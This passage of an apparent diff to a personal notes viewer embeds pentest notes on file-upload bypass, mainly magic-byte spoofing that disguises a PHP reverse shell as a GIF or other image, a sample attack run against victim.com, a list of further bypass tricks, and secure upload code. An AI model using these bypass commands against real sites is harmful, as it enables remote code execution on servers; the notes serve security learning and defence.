command:\n\n```bash\necho -n -e 'GIF87a' > php-reverse-shell-magic.php\n```\n\n**Explanation:**\n\n- `echo -n`: Output without trailing newline\n- `-e`: Enable interpretation of backslash escapes\n- `'GIF87a'`: The ASCII string representing GIF magic number\n- `>`: Redirect output to create new file\n- Writes the ASCII string `\"GIF87a\"` to the beginning of a new file\n\n**What is GIF87a?**\n\n- GIF87a is the magic number/file signature for GIF image files\n- It's the first 6 bytes that identify a file as GIF format\n- All GIF files start with either `GIF87a` or `GIF89a`\n\n#### Step 2: Append PHP Reverse Shell Code\n\nThe command:\n\n```bash\ncat php-reverse-shell.php >> php-reverse-shell-magic.php\n```\n\n**Explanation:**\n\n- `cat`: Read and output file contents\n- `php-reverse-shell.php`: Source file containing PHP malicious code\n- `>>`: Append (not overwrite) to existing file\n- Appends the contents of a PHP reverse shell script to the file created in Step 1\n\n#### Step 3: Verify File Type Detection\n\nThe command:\n\n```bash\nfile php-reverse-shell-magic.php\n```\n\n**Explanation:**\n\n- `file`: Utility to identify file type based on magic bytes\n- Asks the `file` utility to identify the file based on its contents, specifically the initial bytes (magic number)\n\n**Expected Output:**\n\n```\nphp-reverse-shell-magic.php: GIF image data\n```\n\nThe `file` command identifies it as a GIF image because it detects the GIF magic number at the start.\n\n### Outcome and Explanation\n\n#### File Structure\n\nThe resulting file has this structure:\n\n```\n[GIF87a][PHP reverse shell code]\n```\n\n#### Why This Works\n\n1. **The resulting file begins with the bytes corresponding to `GIF87a`**, which is the header signature for GIF image files\n    \n2. **Most file identification tools**, including the `file` command, use magic numbers at the file's start to guess its type. Because this file begins with the GIF header, the `file` command will likely label it as a GIF file, regardless of the actual contents after the header\n    \n3. **The original PHP code remains**, but the file is now (mis-)identified as a GIF image on the basis of its magic number\n    \n4. **If uploaded to a vulnerable application** that only checks MIME type via `mime_content_type()` or similar functions, it will pass as a GIF image\n    \n5. **If the web server executes `.php` files**, accessing this file via the browser will execute the PHP code, even though it's detected as a GIF\n    \n\n#### Security Implications\n\n- **MIME type detection alone is insufficient** for securing file uploads\n- **Magic number spoofing bypasses** content-type validation\n- **The file is executable** if accessed with a `.php` extension or if the server is configured to execute PHP in uploaded directories\n- **Defense requires multiple layers**: extension validation, content inspection, secure storage, and execution prevention\n\n### Important Notes\n\n#### Why This Bypass Works\n\n1. **File type detection is based on initial bytes only** - most tools don't analyze the entire file\n2. **Web servers use file extension to determine execution** - if the extension is `.php`, the server will execute it regardless of magic bytes\n3. **Content after magic bytes is ignored** by MIME detection but executed by PHP interpreter\n4. **No deep content validation** - the validation only checks the file signature, not the entire content\n\n#### Real-World Attack Scenario\n\n```bash\n# Attacker creates malicious file\necho -n -e 'GIF89a' > shell.php\ncat reverse-shell.php >> shell.php\n\n# File is uploaded to vulnerable site\n# MIME detection: image/gif ✓ (passes validation)\n# File saved as: upload/shell.php\n\n# Attacker accesses the file\ncurl http://victim.com/upload/shell.php?cmd=whoami\n# Result: PHP code executes, system compromised\n```\n\n#### Variations of Magic Number Spoofing\n\n**GIF Variations:**\n\n```bash\n# GIF87a (older format)\necho -n -e 'GIF87a' > file.php\n\n# GIF89a (newer format with animation support)\necho -n -e 'GIF89a' > file.php\n```\n\n**Other Image Formats:**\n\n```bash\n# PNG\necho -n -e '\\x89PNG\\r\\n\\x1a\\n' > file.php\ncat shell.php >> file.php\n\n# JPEG\necho -n -e '\\xFF\\xD8\\xFF\\xE0' > file.php\ncat shell.php >> file.php\n\n# BMP\necho -n -e 'BM' > file.php\ncat shell.php >> file.php\n```\n\n#### Detection Methods\n\nFile identification tools will show:\n\n```bash\nfile php-reverse-shell-magic.php\n# Output: GIF image data, version 87a\n\nmime_content_type('php-reverse-shell-magic.php')\n# Output: image/gif\n```\n\nBut the file still contains executable PHP code after the magic bytes.\n\n### Comparison of Detection Methods\n\n|Method|Location|Reliability|Can Be Spoofed?|\n|---|---|---|---|\n|`$_FILES[\"file\"][\"type\"]`|Client-supplied header|Very Low|Yes (easily)|\n|`mime_content_type()`|Server-side magic bytes|Medium|Yes (with effort)|\n|`finfo_file()`|Server-side magic bytes|Medium|Yes (with effort)|\n|`getimagesize()`|Deep image validation|High|Difficult|\n|Extension + Content + finfo|Combined validation|Very High|Very Difficult|\n\n---\n\n## Secure File Upload Best Practices\n\n### 1. Use Whitelisting Instead of Blacklisting\n\n```php\n$allowed = array('jpg', 'jpeg', 'png', 'gif');\n$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\n\nif (!in_array($extension, $allowed)) {\n    die(\"Invalid file type\");\n}\n```\n\n### 2. Validate MIME Type Properly\n\n```php\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\n\n$allowedMimes = array('image/jpeg', 'image/png', 'image/gif');\nif (!in_array($mime, $allowedMimes)) {\n    die(\"Invalid file type\");\n}\n```\n\n### 3. Store Files Outside Web Root\n\n```php\n$uploadDir = '/var/uploads/'; // Outside public_html\nmove_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $filename);\n```\n\n### 4. Rename Uploaded Files\n\n```php\n$newFilename = uniqid() . '.' . $extension;\nmove_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $newFilename);\n```\n\n### 5. Disable Script Execution in Upload Directory\n\nCreate `.htaccess` in upload directory:\n\n```apache\n<FilesMatch \"\\.ph(?:p[3-7]?|tml|ar)$\">\n    Require all denied\n</FilesMatch>\n\nphp_flag engine off\n```\n\n### 6. Validate File Content\n\n```php\n// For images, verify it's actually an image\nif (@getimagesize($_FILES['file']['tmp_name']) === false) {\n    die(\"File is not a valid image\");\n}\n```\n\n### 7. Set Proper File Permissions\n\n```php\nchmod($uploadedFile, 0644); // Read/write for owner, read-only for others\n```\n\n### 8. Implement File Size Limits\n\n```php\n$maxSize = 5 * 1024 * 1024; // 5MB\nif ($_FILES['file']['size'] > $maxSize) {\n    die(\"File too large\");\n}\n```\n\n---\n\n## Complete Secure Upload Example\n\n```php\n<?php\nsession_start();\n\n// CSRF token validation\nif (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {\n    die(\"CSRF token validation failed\");\n}\n\nif (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {\n    \n    // 1. File size validation\n    $maxSize = 5 * 1024 * 1024; // 5MB\n    if ($_FILES['file']['size'] > $maxSize) {\n        die(\"File too large\");\n    }\n    \n    // 2. Extension whitelist\n    $allowed = array('jpg', 'jpeg', 'png', 'gif');\n    $filename = $_FILES['file']['name'];\n    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));\n    \n    if (!in_array($extension, $allowed)) {\n        die(\"Invalid file type\");\n    }\n    \n    // 3. MIME type validation using finfo\n    $finfo = finfo_open(FILEINFO_MIME_TYPE);\n    $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\n    finfo_close($finfo);\n    \n    $allowedMimes = array(\n        'image/jpeg',\n        'image/png',\n        'image/gif'\n    );\n    \n    if (!in_array($mime, $allowedMimes)) {\n        die(\"Invalid MIME type\");\n    }\n    \n    // 4. Verify image integrity\n    if (@getimagesize($_FILES['file']['tmp_name']) === false) {\n        die(\"File is not a valid image\");\n    }\n    \n    // 5. Generate safe filename\n    $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;\n    \n    // 6. Upload to secure directory (outside web root)\n    $uploadDir = '/var/secure_uploads/';\n    $destination = $uploadDir . $newFilename;\n    \n    if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {\n        // 7. Set secure permissions\n        chmod($destination, 0644);\n        \n        // 8. Log the upload\n        error_log(\"File uploaded: $newFilename by user \" . $_SESSION['user_id']);\n        \n        echo \"File uploaded successfully\";\n    } else {\n        die(\"Upload failed\");\n    }\n} else {\n    die(\"No file uploaded or upload error\");\n}\n?>\n```\n\n---\n\n## Testing and Penetration Testing Tools\n\n### Tools for Testing File Upload Vulnerabilities\n\n- **Burp Suite**: Intercept and modify requests\n- **OWASP ZAP**: Automated security testing\n- **PHP Shell**: Test if uploaded file executes\n- **Weevely**: Generate obfuscated PHP shells\n\n### Common Attack Vectors to Test\n\n1. Extension manipulation (`.php`, `.phtml`, `.php5`, etc.)\n2. MIME type spoofing\n3. Double extensions (`.jpg.php`)\n4. Null byte injection (`.php%00.jpg`)\n5. Path traversal (`../../shell.php`)\n6. Polyglot files (valid image + PHP code)\n\n---\n\n## References and Further Reading\n\n- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\n- [PHP Manual: Handling File Uploads](https://www.php.net/manual/en/features.file-upload.php)\n- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)\n\n---\n\n## Notes\n\n- Always use multiple layers of validation\n- Never trust client-side validation alone\n- Keep PHP and web server updated\n- Monitor upload directories for suspicious files\n- Implement rate limiting to prevent abuse\n- Consider using a dedicated file storage service (AWS S3, etc.)\n\n---\n\n_Document created for educational and security awareness purposes._ _Last updated: October 2025_"}, {"name": "how to check front hand validation", "content": "if mujhe sirf particular file hi upload karne ko mile aur developeer ne ye front hand me hi lavaya ho toh burp me dekhe uploadnkarke restrict file if koi request uske bad show nhi hop ri toh wo front hand validation hai\n"}];
+var isMobile = window.innerWidth <= 768;
+
+window.addEventListener('resize', function() { isMobile = window.innerWidth <= 768; });
+
+function showSidebar() {
+  document.getElementById('sidebar').classList.remove('hidden');
+  document.getElementById('viewer').classList.add('hidden');
+}
+
+function showViewer() {
+  if (isMobile) {
+    document.getElementById('sidebar').classList.add('hidden');
+    document.getElementById('viewer').classList.remove('hidden');
+  }
+}
 
 function buildSidebar(filter) {
   var list = document.getElementById('fileList');
@@ -147,13 +196,10 @@ function renderMd(raw) {
 
   for (var i = 0; i < lines.length; i++) {
     var line = lines[i];
-
-    // Fenced code block toggle
     if (line.match(/^```/)) {
       if (!inCode) {
         if (inList) { out += '</ul>'; inList = false; }
-        inCode = true;
-        codeBuffer = '';
+        inCode = true; codeBuffer = '';
       } else {
         inCode = false;
         out += '<pre><code>' + escHtml(codeBuffer) + '</code></pre>';
@@ -161,59 +207,38 @@ function renderMd(raw) {
       }
       continue;
     }
-
-    if (inCode) {
-      codeBuffer += (codeBuffer ? '\n' : '') + line;
-      continue;
-    }
-
+    if (inCode) { codeBuffer += (codeBuffer ? '\n' : '') + line; continue; }
     var e = escHtml(line);
-
-    // Headings
     if (e.match(/^#### /)) { if(inList){out+='</ul>';inList=false;} out += '<h4>' + e.slice(5) + '</h4>'; continue; }
     if (e.match(/^### /))  { if(inList){out+='</ul>';inList=false;} out += '<h3>' + e.slice(4) + '</h3>'; continue; }
     if (e.match(/^## /))   { if(inList){out+='</ul>';inList=false;} out += '<h2>' + e.slice(3) + '</h2>'; continue; }
     if (e.match(/^# /))    { if(inList){out+='</ul>';inList=false;} out += '<h1>' + e.slice(2) + '</h1>'; continue; }
-
-    // HR
     if (e.match(/^---+$/)) { if(inList){out+='</ul>';inList=false;} out += '<hr>'; continue; }
-
-    // Blockquote
-    if (e.match(/^&gt; /)) { if(inList){out+='</ul>';inList=false;} out += '<blockquote>' + inlineFormat(e.slice(5)) + '</blockquote>'; continue; }
-
-    // List item
+    if (e.match(/^&gt; /)) { if(inList){out+='</ul>';inList=false;} out += '<blockquote>' + inlineFmt(e.slice(5)) + '</blockquote>'; continue; }
     if (e.match(/^[\*\-] /) || e.match(/^\d+\. /)) {
       if (!inList) { out += '<ul>'; inList = true; }
-      var itemText = e.match(/^[\*\-] /) ? e.slice(2) : e.replace(/^\d+\. /,'');
-      out += '<li>' + inlineFormat(itemText) + '</li>';
+      var txt = e.match(/^[\*\-] /) ? e.slice(2) : e.replace(/^\d+\.\s/,'');
+      out += '<li>' + inlineFmt(txt) + '</li>';
       continue;
     }
-
-    // Empty line
     if (e.trim() === '') {
       if (inList) { out += '</ul>'; inList = false; }
       out += '<br>';
       continue;
     }
-
-    // Normal paragraph line
     if (inList) { out += '</ul>'; inList = false; }
-    out += '<p>' + inlineFormat(e) + '</p>';
+    out += '<p>' + inlineFmt(e) + '</p>';
   }
-
   if (inList) out += '</ul>';
   if (inCode) out += '<pre><code>' + escHtml(codeBuffer) + '</code></pre>';
   return out;
 }
 
-function inlineFormat(t) {
-  // Inline code
+function inlineFmt(t) {
   t = t.replace(/`([^`]+)`/g, function(m,c){ return '<code>' + c + '</code>'; });
-  // Bold+italic
   t = t.replace(/\*\*\*([^*]+)\*\*\*/g, '<strong><em>$1</em></strong>');
   t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
   t = t.replace(/\*([^*]+)\*/g, '<em>$1</em>');
-  // Links
   t = t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
   return t;
 }
@@ -227,12 +252,12 @@ function openNote(idx) {
   var viewer = document.getElementById('viewerContent');
   viewer.innerHTML = renderMd(NOTES[idx].content);
   viewer.scrollTop = 0;
+  showViewer();
 }
 
-// RUN ON PAGE LOAD
 window.onload = function() {
   buildSidebar();
-  if (NOTES.length > 0) openNote(0);
+  if (!isMobile && NOTES.length > 0) openNote(0);
 };
 </script>
 </body>
